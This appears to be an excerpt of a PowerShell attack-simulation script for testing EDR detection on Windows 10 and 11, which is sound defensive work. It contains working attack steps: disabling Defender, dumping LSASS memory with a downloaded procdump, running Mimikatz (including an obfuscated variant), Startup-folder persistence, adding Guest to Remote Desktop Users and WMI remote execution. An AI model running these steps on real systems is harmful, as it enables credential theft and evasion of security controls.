...
# The only real malware employed is mimikatz and it will only be used to extract passwords, those passwords will not be saved or sent anywhere.
# Updated for Windows 10 and Windows 11 compatibility
...
if ($isWindows11) {
    Write-Host "[Info] Detected Windows 11 (Build $($osVersion.Build))" -ForegroundColor Green
} else {
    Write-Host "[Info] Detected Windows 10 (Build $($osVersion.Build))" -ForegroundColor Green
}

$agent = Get-Service -Name HUNTAgent -ErrorAction SilentlyContinue
...
# Handle AV enumeration separately (WMIC deprecated in Win11)
"" | Out-File -FilePath "$attackDir\recon.txt" -Append
"==== Antivirus Product ====" | Out-File -FilePath "$attackDir\recon.txt" -Append
if ($isWindows11) {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, pathToSignedProductExe, pathToSignedReportingExe, productState | Format-List | Out-File -FilePath "$attackDir\recon.txt" -Append
} else {
    $avcmd = "WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,pathToSignedProductExe,pathToSignedReportingExe,productState 2>&1 >> $attackDir\recon.txt"
    cmd.exe /c $avcmd
}

# Continue with network enumeration
$cmd = @"
    '' >> $attackDir\recon.txt
...
# Windows 11 has stricter Defender controls - using try-catch
$cmd = @"
try {
    Set-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction SilentlyContinue
} catch {
    Write-Host 'Defender modification blocked (expected in Windows 11 with Tamper Protection)'
}
Start-Sleep -m $n
"@
powershell.exe -Win N -exec bypass -nop -command $cmd
...
Write-Host "Downloading EICAR file..."
try {
    Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\EICAR.exe" -UseBasicParsing
} catch {
    Write-Host "EICAR download blocked (expected behavior)"
}

Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence with detectable malware (EICAR File)"
Write-Host "Downloading EICAR file..."
try {
    Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "$attackDir\EICAR.exe" -UseBasicParsing
} catch {
    Write-Host "EICAR download blocked (expected behavior)"
}
...
Write-Host "Adding Persistence - T1053 - On Startup Scheduled Task Startup Script"
...
try {
    Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$AttackDir\procdump.exe" -UseBasicParsing
    Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
    & $AttackDir\procdump.exe -ma lsass.exe "$attackDir\lsass.dmp" -accepteula -dc $n 2>$null
    Start-Sleep 2
    Remove-Item "$attackDir\lsass.dmp" -Force -ErrorAction Ignore
} catch {
    Write-Host "ProcDump download or execution blocked (expected with enhanced security)"
}

Write-host "Initiating Credential Access - T1003 - Credential Dumping with Mimikatz"
# Mimikatz execution - likely to be blocked by Windows 11 enhanced security
try {
    ...
    Write-Host "Mimikatz execution blocked (expected with EDR/AV)"
}
...
try {
    ...
    Write-Host 'Obfuscated Mimikatz execution blocked (expected)'
}
'@
$cmd += "`nStart-Sleep -m $n"
powershell.exe -Win N -exec bypass -nop -command $cmd
...
net localgroup "Remote Desktop Users" Guest /add /comment:"$n" 2>$null
Start-Sleep 3
Write-Host "Removing Guest from Remote Desktop Users"
net localgroup "Remote Desktop Users" Guest /delete 2>$null

$cmd = "Enable-WSManCredSSP -Role Server -Force 2>&1; Start-Sleep -m $n"
Powershell.exe -nop -command $cmd

# Execute Remote Command using CIM instead of WMIC for Win11 compatibility
if ($isWindows11) {
    try {
        Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell.exe -command {$a = "EICARTES"; $a+= "T"; cmd.exe /c echo $a}'} -ComputerName localhost -ErrorAction SilentlyContinue
    } catch {
        Write-Host "Remote command execution test completed"
    }
} else {
    wmic /node:localhost process call create 'powershell.exe -command {$a = "EICARTES"; $a+= "T"; cmd.exe /c echo $a}' 2>$null
}
...
Write-Host "Restoring system settings..."
...
try {
    ...
    Write-Host "Defender settings restored (or were protected)"
}

# Cleanup AlwaysInstallElevated
...
# Cleanup registry run keys
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f 2>$null

Write-Host "`nCleanup completed. Check your EDR console for detected activities." -ForegroundColor Green
